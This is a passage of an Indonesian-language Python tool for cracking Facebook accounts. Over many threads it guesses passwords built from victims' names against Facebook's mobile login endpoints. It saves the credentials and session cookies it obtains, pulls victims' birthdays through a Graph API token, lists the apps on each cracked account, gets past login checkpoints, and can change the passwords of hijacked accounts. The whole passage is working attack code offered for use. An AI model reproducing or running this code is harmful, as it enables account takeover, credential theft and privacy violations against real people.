		elif suuu in ('1', '01'):
			print ('\n %s- akun %s[OK] %stersimpan ke file : %sOK/%s.txt'%(P,H,P,H,waktu));jeda(0.2)
			print (' %s- akun %s[CP] %stersimpan ke file : %sOK/%s.txt'%(P,K,P,K,waktu));jeda(0.2)
			jalan ('\n%s setiap crack 1k ID, mainkan mode pesawat %s2 %sdetik \n'%(P,H,P));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.touch, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('2', '02'):
			print ('\n %s- akun %s[OK] %stersimpan ke file : %sOK/%s.txt'%(P,H,P,H,waktu));jeda(0.2)
			print (' %s- akun %s[CP] %stersimpan ke file : %sOK/%s.txt'%(P,K,P,K,waktu));jeda(0.2)
			jalan ('\n%s setiap crack 1k ID, mainkan mode pesawat %s2 %sdetik \n'%(P,H,P));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.basic, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('3', '03'):
			print ('\n %s- akun %s[OK] %stersimpan ke file : %sOK/%s.txt'%(P,H,P,H,waktu));jeda(0.2)
			print (' %s- akun %s[CP] %stersimpan ke file : %sOK/%s.txt'%(P,K,P,K,waktu));jeda(0.2)
			jalan ('\n%s setiap crack 1k ID, mainkan mode pesawat %s2 %sdetik \n'%(P,H,P));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobil, uid, pwx)
					except: pass
			hasil(ok,cp)
		else:
			print("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			self.langsung()
			
	# TOUCH
	def touch(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,P,H,len(ok),P,K,P,K,len(cp),P)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = ("Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba")
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r {H}[-] {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ')
						#os.popen("play-audio dapet.mp3")
						ok.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r {H}[-]{user} ◊ {pw} ◊ {kukis} ')
					#os.popen("play-audio dapet.mp3")
					ok.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' [-] {user} ◊ {pw} ◊ {kukis}\n')
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r {K}[-] {user} ◊ {pw} ◊ {day} {month} {year}  ')
						#os.popen("play-audio dapet.mp3")
						cp.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r {K}[-] {user} ◊ {pw}           ')
					#os.popen("play-audio dapet.mp3")
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw}\n")
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.touch(user, manual, **data)
			
	# MBASIC
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,P,H,len(ok),P,K,P,K,len(cp),P)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"gzid-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r {H}[-] {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ')
						#os.popen("play-audio dapet.mp3")
						ok.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r {H}[-] {user} ◊ {pw} ◊ {kukis} ')
					#os.popen("play-audio dapet.mp3")
					ok.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' [-] {user} ◊ {pw} ◊ {kukis}\n')
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r {K}[-] {user} ◊ {pw} ◊ {day} {month} {year}  ')
						#os.popen("play-audio dapet.mp3")
						cp.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r {K}[-] {user} ◊ {pw}           ')
					#os.popen("play-audio dapet.mp3")
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw}\n")
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.basic(user, manual, **data)
	
	# MOBILE
	def mobil(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,P,H,len(ok),P,K,P,K,len(cp),P)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = ("NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+ UNTRUSTED/1.0")
				ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'empty','accept-language': 'en-US,en;q=0.9,es;q=0.8,es-MX;q=0.7'})
				p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr')
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://m.facebook.com/login.php","flow":"login_no_pin","pass":pw,}
				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
				koki+=' m_pixel_ratio=2.625; wd=412x756'
				heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': f'" Not A;Brand";v="99", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9,es;q=0.8,es-MX;q=0.7','connection': 'keep-alive'}
				po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r {H}[-] {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ')
						#os.popen("play-audio dapet.mp3")
						ok.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r {H}[-] {user} ◊ {pw} ◊ {kukis} ')
					#os.popen("play-audio dapet.mp3")
					ok.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' [-] {user} ◊ {pw} ◊ {kukis}\n')
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r {K}[-] {user} ◊ {pw} ◊ {day} {month} {year}  ')
						#os.popen("play-audio dapet.mp3")
						cp.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r {K}[-] {user} ◊ {pw}           ')
					#os.popen("play-audio dapet.mp3")
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" [-] {user} ◊ {pw}\n")
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	#os.popen('play-audio data/selesai.mp3')
	if len(ok) != 0 or len(cp) != 0:
		print("\n%s√ finished"%(H))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		print('%s• %sOK%s : %s%s'%(U,H,M,H,str(len(ok))))
		print('%s• %sCP%s : %s%s'%(U,K,M,K,str(len(cp))))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		if len(cp)==0:
			exit()
		else:
			c = input('\n %s[%s?%s] %sGunakan detektor checkpoint (%sy%s/%st%s)%s : %s'%(O,P,O,P,H,P,K,P,H,M))
			if c =='':
				exit("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			elif c in['Y','y']:
				jalan("\n%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
				pw=input("%s%s%s ubah sandi akun one tab? y/t %s> %s"%(U,til,O,M,K))
				if pw =='':
					print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s%s%s Masukan sandi %s> %s"%(U,til,O,M,K))
					if len(pw2) <= 5:
						print("%s%s Sandi minimal 6 karakter "%(M,til))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					akun = fb.replace("\n","")
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
					try:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s• tidak ada koneksi "%(M)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
				os.popen('play-audio data/cek.mp3')
				input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
				Menu()
			elif c in['t','T']:
				exit()
			else:
				exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
	else:
		exit(f"\n{M}{til} Ops... tidak mendapatkan hasil :(")

# CEK APLIKASI 
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

# CEKPOINT DETEKTOR
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
	try:
		print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s• file tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s• sandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
	#os.popen('play-audio data/cek.mp3')
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	Menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s• akun terkunci sesi new"%(M))
		else:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			#os.popen('play-audio dapet.mp3')
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s akun one tab, sandi berhasil di ubah \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
						#os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s akun one tab, silahkan anda login		"%(H,til))
					#os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s terjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
				#os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	else:
		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
		
#HAPUS HASIL
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	print ('');jeda(2)
	jalan (H+' √ berhasil menghapus hasil crack ');jeda(2)
	Menu()
	
# CEK HASIL
def hasill():
	print ('\n %s[%s1%s] %sCek hasil akun %sOK '%(O,P,O,P,H))
	print (' %s[%s2%s] %sCek hasil akun %sCP '%(O,P,O,P,K))
	
# CEK HASIL FACEBOOK
def hasil_fb():
	hasill()
	l = input("\n %s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
	if l in['']:
		print ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
		menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print ('\n%s HASIL CRACK YANG TERSIMPAN \n'%(P))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print ('\n%s HASIL CRACK YANG TERSIMPAN \n'%(P))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
			totalcp = open('CP/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
